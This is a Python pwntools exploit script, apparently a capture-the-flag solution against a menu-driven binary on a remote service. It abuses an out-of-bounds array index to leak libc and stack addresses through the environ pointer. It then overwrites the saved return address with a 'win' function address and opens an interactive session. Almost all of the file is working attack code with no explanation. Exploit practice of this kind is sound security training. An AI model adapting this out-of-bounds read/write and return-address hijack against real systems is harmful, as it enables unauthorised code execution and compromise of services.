from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "35.194.118.87"
    port = 9003
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, b'\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    if type(x) == str:
        x = x.encode("ascii")
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip(b'\n')

def sendline(s, verbose=True):
    if type(s) == str:
        s = s.encode("ascii")
    if log and verbose:
        print(s)
    r.sendline(s)

def send(s, verbose=True):
    if type(s) == str:
        s = s.encode("ascii")
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(b':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=b': '):
    recvuntil(r)
    #s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

# send `s` after r
def sa(r, s, new_line=True):
    rs(s, new_line, r)

array_addr = 0x404040
win_addr = 0x4011d6

idx1 = str(-0x80 // 8)

rs(str(1), r="> ")
rs(str(idx1).encode("ascii") )
libc_addr = int(recvline())
environ = libc_addr + 0x10c7e0

print(hex(environ))
idx2 = (environ - array_addr) // 8
print("idx2: ", idx2)
rs("1", r="> ")
rs(str(idx2).encode("ascii") )
stack_addr = int(recvline())
print(hex(stack_addr))

ret_addr = stack_addr - 0x120
print(hex(ret_addr))

idx2 = (ret_addr - array_addr) // 8
print("idx2: ", idx2)
rs("2", r="> ")
rs(str(idx2).encode("ascii") )
wait_for_attach()
rs(str(win_addr))
print(hex(stack_addr))

interactive()
